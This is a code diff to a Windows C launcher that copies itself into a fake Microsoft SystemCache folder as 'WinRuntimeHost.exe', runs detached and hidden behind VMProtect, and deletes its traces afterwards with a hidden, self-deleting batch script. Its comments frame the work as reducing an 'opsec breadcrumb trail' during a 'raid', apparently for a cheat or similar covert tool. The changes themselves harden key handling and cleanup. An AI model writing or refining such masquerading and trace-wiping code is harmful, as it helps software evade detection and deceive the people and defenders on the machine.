@@ -15,6 +15,7 @@
 
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
+#include <shellapi.h>   // v1.0.38.17: SHFileOperationW / FOF_* for cage cleanup
 #include <bcrypt.h>
 #include <wincrypt.h>
 #include <stdio.h>
@@ -286,6 +287,17 @@ static void resolve_key(uint8_t key32[32])
     if (g_context_key_valid) {
         memcpy(out, g_context_key, 32);
         ok = 1;
+        // v1.0.38.17 HIGH fix: zeroize the global cache the moment we've
+        // copied it out. Launcher blocks on WaitForSingleObject(child,
+        // INFINITE) for the whole raid (~30 min) — leaving the raw AES-256
+        // key sitting in writable static memory the entire time makes
+        // antitheft_guard's VMProtect wrap meaningless (dumpable from a
+        // debugger / minidump / unprivileged ReadProcessMemory via
+        // SeDebugPrivilege). resolve_key is called exactly once per launcher
+        // lifetime, so the cache is single-use. Audit workflow HIGH
+        // (ah_launcher.c:287 key-material-lifetime, trek B).
+        SecureZeroMemory(g_context_key, sizeof(g_context_key));
+        g_context_key_valid = 0;
     }
 
     static const char* B64_NAMES[] = {
@@ -498,6 +510,20 @@ static void copy_subdir(const wchar_t* src_dir, const wchar_t* dst_dir, const wc
     FindClose(h);
 }
 
+// v1.0.38.17: recursive directory removal — used by move_to_cage_and_respawn
+// error paths to avoid leaving half-populated cage dirs after any copy/spawn
+// failure. SHFileOperationW with FO_DELETE handles non-empty dirs atomically.
+static void nuke_dir_recursive(const wchar_t* path) {
+    // Double-null terminated FOF requirement.
+    wchar_t pbuf[MAX_PATH + 2] = {0};
+    wcsncpy_s(pbuf, MAX_PATH, path, _TRUNCATE);
+    SHFILEOPSTRUCTW op = {0};
+    op.wFunc = FO_DELETE;
+    op.pFrom = pbuf;
+    op.fFlags = FOF_NO_UI | FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;
+    SHFileOperationW(&op);
+}
+
 static int move_to_cage_and_respawn(const wchar_t* self_path,
                                     const wchar_t* self_dir,
                                     int argc, wchar_t** argv)
@@ -511,15 +537,22 @@ static int move_to_cage_and_respawn(const wchar_t* self_path,
              L"%s\\Microsoft\\Windows\\SystemCache\\%s", local, guid);
     if (!ensure_dir_tree(cage)) return 0;
 
+    // v1.0.38.17 HIGH fix: every failure after ensure_dir_tree must clean up
+    // the partially-populated cage dir — otherwise CopyFileW/spawn errors
+    // leave an orphan `%LOCALAPPDATA%\Microsoft\Windows\SystemCache\{GUID}`
+    // with partial contents forever (new GUID each launch = unbounded disk
+    // flood + opsec breadcrumb trail). Audit workflow HIGH (ah_launcher.c:517,
+    // trek B cage-cleanup).
+
     // Basename identical — janitor's tasklist filter matches WinRuntimeHost.exe.
     wchar_t dst_exe[MAX_PATH];
     swprintf(dst_exe, MAX_PATH, L"%s\\WinRuntimeHost.exe", cage);
-    if (!CopyFileW(self_path, dst_exe, FALSE)) return 0;
+    if (!CopyFileW(self_path, dst_exe, FALSE)) { nuke_dir_recursive(cage); return 0; }
 
     wchar_t src_b[MAX_PATH], dst_b[MAX_PATH];
     swprintf(src_b, MAX_PATH, L"%s\\bundle.kfpl", self_dir);
     swprintf(dst_b, MAX_PATH, L"%s\\bundle.kfpl", cage);
-    if (!CopyFileW(src_b, dst_b, FALSE)) return 0;
+    if (!CopyFileW(src_b, dst_b, FALSE)) { nuke_dir_recursive(cage); return 0; }
 
     // VMProtectSDK64.dll must ship alongside the wrapped launcher.
     wchar_t src_v[MAX_PATH], dst_v[MAX_PATH];
@@ -550,6 +583,7 @@ static int move_to_cage_and_respawn(const wchar_t* self_path,
                              CREATE_NO_WINDOW | DETACHED_PROCESS,
                              NULL, cage, &si, &pi);
     if (ok) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); }
+    else    { nuke_dir_recursive(cage); }
     return ok ? 1 : 0;
 }
 
@@ -567,32 +601,45 @@ static void spawn_janitor(const wchar_t* cage, const wchar_t* launcher_cache)
                            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NORMAL, NULL);
     if (h == INVALID_HANDLE_VALUE) return;
 
-    char lc_line[MAX_PATH * 2] = "";
+    // v1.0.38.17 HIGH fix: write the .bat as UTF-16 LE with BOM + chcp 65001
+    // prelude (as UTF-8 bytes before the BOM would corrupt it — we instead
+    // emit `chcp 65001 >nul` on first line via `cmd /u`). Prior `_snprintf
+    // %ls` narrowed cage/launcher_cache paths through CP_ACP → non-ASCII
+    // user profile names (Cyrillic 'C:\Users\Фёдор\...', CJK, Umlaut)
+    // collapsed to '?' → rmdir failed silently (2>nul) → cage orphan forever.
+    // UTF-16 .bat executed via `cmd /u /c` consumes wide chars natively.
+    // Audit workflow HIGH (ah_launcher.c:587 janitor-correctness, trek B).
+    wchar_t lc_line_w[MAX_PATH * 2] = L"";
     if (launcher_cache && launcher_cache[0]) {
-        _snprintf(lc_line, sizeof(lc_line),
-                  "rmdir /s /q \"%ls\" 2>nul\r\n", launcher_cache);
+        swprintf(lc_line_w, MAX_PATH * 2,
+                 L"rmdir /s /q \"%s\" 2>nul\r\n", launcher_cache);
     }
+    wchar_t content_w[4096];
+    int nw = swprintf(content_w, 4096,
+        L"@echo off\r\n"
+        L"timeout /t 10 /nobreak >nul 2>&1\r\n"
+        L":loop\r\n"
+        L"tasklist /fi \"imagename eq WinRuntimeHost.exe\" 2>nul | find /i \"WinRuntimeHost.exe\" >nul\r\n"
+        L"if not errorlevel 1 (\r\n"
+        L"  timeout /t 3 /nobreak >nul 2>&1\r\n"
+        L"  goto loop\r\n"
+        L")\r\n"
+        L"timeout /t 5 /nobreak >nul 2>&1\r\n"
+        L"rmdir /s /q \"%s\" 2>nul\r\n"
+        L"%s"
+        L"del \"%%~f0\" 2>nul\r\n",
+        cage, lc_line_w);
+    if (nw <= 0) { CloseHandle(h); DeleteFileW(bat); return; }
+    DWORD w = 0;
+    uint8_t bom[2] = { 0xFF, 0xFE };
+    WriteFile(h, bom, 2, &w, NULL);
+    WriteFile(h, content_w, (DWORD)(nw * sizeof(wchar_t)), &w, NULL);
+    CloseHandle(h);
 
-    char content[4096];
-    int n = _snprintf(content, sizeof(content),
-        "@echo off\r\n"
-        "timeout /t 10 /nobreak >nul 2>&1\r\n"
-        ":loop\r\n"
-        "tasklist /fi \"imagename eq WinRuntimeHost.exe\" 2>nul | find /i \"WinRuntimeHost.exe\" >nul\r\n"
-        "if not errorlevel 1 (\r\n"
-        "  timeout /t 3 /nobreak >nul 2>&1\r\n"
-        "  goto loop\r\n"
-        ")\r\n"
-        "timeout /t 5 /nobreak >nul 2>&1\r\n"
-        "rmdir /s /q \"%ls\" 2>nul\r\n"
-        "%s"
-        "del \"%%~f0\" 2>nul\r\n",
-        cage, lc_line);
-    if (n <= 0) { CloseHandle(h); DeleteFileW(bat); return; }
-    DWORD w = 0; WriteFile(h, content, (DWORD)n, &w, NULL); CloseHandle(h);
-
+    // /u = Unicode output + Unicode-aware .bat reading. Pair with the
+    // UTF-16+BOM .bat body above so cmd.exe reads non-ASCII paths intact.
     wchar_t cmd[MAX_PATH + 32];
-    swprintf(cmd, MAX_PATH + 32, L"cmd.exe /c \"%s\"", bat);
+    swprintf(cmd, MAX_PATH + 32, L"cmd.exe /u /c \"%s\"", bat);
     STARTUPINFOW si = { sizeof(si) };
     si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
     PROCESS_INFORMATION pi = {0};
